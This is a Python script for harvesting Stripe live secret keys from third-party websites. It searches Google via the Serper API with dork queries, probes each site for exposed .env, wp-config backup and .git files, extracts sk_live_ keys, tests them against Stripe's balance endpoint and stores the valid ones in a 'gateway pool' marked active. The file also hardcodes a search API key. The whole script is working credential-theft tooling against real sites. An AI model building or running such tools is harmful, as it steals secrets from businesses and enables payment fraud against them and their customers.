"""
Hunt for sk_live_ keys on LIVE websites by checking exposed files.
Many sites accidentally expose .env, wp-config.php, config files etc.
Uses our gateway pool + Serper to find targets.
"""
import asyncio, json, re, httpx
from pathlib import Path

POOL_FILE = Path(__file__).parent / "gateway_pool.json"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"
SERPER_KEY = "8061e80440f132abe401622d73c98db8e90690c8"

# Paths that might expose sk_live_ on live sites
EXPOSED_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.staging",
    "/.env.backup",
    "/.env.save",
    "/.env.old",
    "/.env.bak",
    "/.env.swp",
    "/.env~",
    "/wp-config.php.bak",
    "/wp-config.php.save",
    "/wp-config.php.old",
    "/wp-config.php.swp",
    "/wp-config.php~",
    "/config.php.bak",
    "/config/settings.json",
    "/config/secrets.json",
    "/.env.example",
    "/stripe/config.json",
    "/api/config",
    "/debug",
    "/.git/config",
    "/.git/HEAD",
    "/server/.env",
    "/backend/.env",
    "/api/.env",
    "/app/.env",
    "/application/.env",
]

SERPER_QUERIES = [
    # Sites that expose .env with Stripe keys
    'inurl:".env" "sk_live_" -github.com -gitlab.com',
    'inurl:"wp-config" "sk_live_" -github.com',
    '"sk_live_" "DB_PASSWORD" inurl:config -github.com',
    '"STRIPE_SECRET" "sk_live_" filetype:env -github.com',
    '"sk_live_" "STRIPE_SECRET_KEY" inurl:.env -github.com',
    # Laravel/PHP sites
    '"sk_live_" inurl:".env" "APP_KEY" -github.com',
    # Node/Next.js
    '"sk_live_" "NEXT_PUBLIC" inurl:.env -github.com',
    # Django
    '"sk_live_" "DJANGO_SECRET" inurl:.env -github.com',
    # WordPress specific
    '"sk_live_" "DB_NAME" "wp_" inurl:wp-config -github.com',
    # Direct exposure
    '"sk_live_51" inurl:.env -github.com -gitlab.com',
    '"sk_live_" intitle:"Index of" ".env" -github.com',
]

def load_pool():
    if POOL_FILE.exists():
        return json.loads(POOL_FILE.read_text(encoding="utf-8"))
    return []

def save_pool(pool):
    POOL_FILE.write_text(json.dumps(pool, ensure_ascii=False, indent=2), encoding="utf-8")

async def serper_search(client, query):
    try:
        r = await client.post("https://google.serper.dev/search",
            json={"q": query, "num": 20},
            headers={"X-API-KEY": SERPER_KEY, "Content-Type": "application/json"}, timeout=15)
        if r.status_code != 200:
            return []
        data = r.json()
        return [item["link"] for item in data.get("organic", []) if item.get("link")]
    except:
        return []

async def check_exposed_paths(client, base_url):
    """Check common exposed file paths for sk_live_"""
    found_keys = []
    for path in EXPOSED_PATHS:
        try:
            r = await client.get(f"{base_url}{path}", headers={"User-Agent": UA}, timeout=5,
                                 follow_redirects=False)
            if r.status_code == 200:
                content = r.text[:5000]
                keys = re.findall(r'sk_live_[0-9a-zA-Z]{24,}', content)
                for k in keys:
                    found_keys.append((k, f"{base_url}{path}"))
        except:
            continue
    return found_keys

async def verify_sk(client, sk_key):
    """Verify if sk_live_ key is valid via Stripe balance API"""
    try:
        r = await client.get("https://api.stripe.com/v1/balance",
            headers={"Authorization": f"Bearer {sk_key}", "Accept": "application/json",
                     "Stripe-Version": "2023-10-16"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            available = data.get("available", [])
            print(f"    [★★★] VALID sk! Balance: {available}")
            return True
        else:
            err = r.json().get("error", {}).get("message", "")[:60]
            print(f"    [-] Invalid: {err}")
            return False
    except Exception as e:
        print(f"    [-] Error: {e}")
        return False

async def run():
    pool = load_pool()
    all_urls = set()
    
    # Step 1: Serper search for exposed .env files
    print("[1] Searching Serper for sites with exposed sk_live_...")
    async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": UA}) as client:
        for i, q in enumerate(SERPER_QUERIES):
            print(f"  [{i+1}/{len(SERPER_QUERIES)}] {q[:50]}...", end=" ", flush=True)
            found = await serper_search(client, q)
            new = 0
            for u in found:
                if "github.com" not in u and "gitlab.com" not in u:
                    from urllib.parse import urlparse
                    base = f"https://{urlparse(u).netloc}"
                    if base not in all_urls:
                        all_urls.add(base)
                        new += 1
            print(f"+{new}")
            await asyncio.sleep(1.2)
        
        print(f"\n[2] Found {len(all_urls)} unique sites. Checking exposed paths...")
        
        # Step 2: Check exposed paths on found sites
        sem = asyncio.Semaphore(10)
        all_found_keys = []
        
        async def check_site(url):
            async with sem:
                keys = await check_exposed_paths(client, url)
                return url, keys
        
        results = await asyncio.gather(*[check_site(u) for u in all_urls])
        
        for url, keys in results:
            if keys:
                for sk, path in keys:
                    print(f"  [★] Found sk at {path}: {sk[:15]}...")
                    all_found_keys.append((sk, path))
        
        # Step 3: Also check our existing gateway pool
        print(f"\n[3] Checking exposed paths on {len(pool)} pool sites...")
        pool_urls = [g.get("url","") for g in pool if g.get("url")]
        
        results2 = await asyncio.gather(*[check_site(u) for u in pool_urls[:30]])
        for url, keys in results2:
            if keys:
                for sk, path in keys:
                    print(f"  [★] Found sk at {path}: {sk[:15]}...")
                    all_found_keys.append((sk, path))
        
        # Step 4: Verify all found keys
        print(f"\n[4] Verifying {len(all_found_keys)} found keys...")
        valid_count = 0
        for sk, path in all_found_keys:
            print(f"  Checking {sk[:15]}... from {path}")
            is_valid = await verify_sk(client, sk)
            if is_valid:
                valid_count += 1
                # Save to pool
                pool.append({
                    "url": path,
                    "pk_key": "",
                    "sk_key": sk,
                    "tokenization": "sk_valid",
                    "status": "active",
                    "error_count": 0,
                    "check_count": 0,
                    "note": f"sk found on live site: {path}"
                })
                save_pool(pool)
        
        print(f"\n[OK] Valid sk_live_ keys: {valid_count}/{len(all_found_keys)}")

if __name__ == "__main__":
    asyncio.run(run())
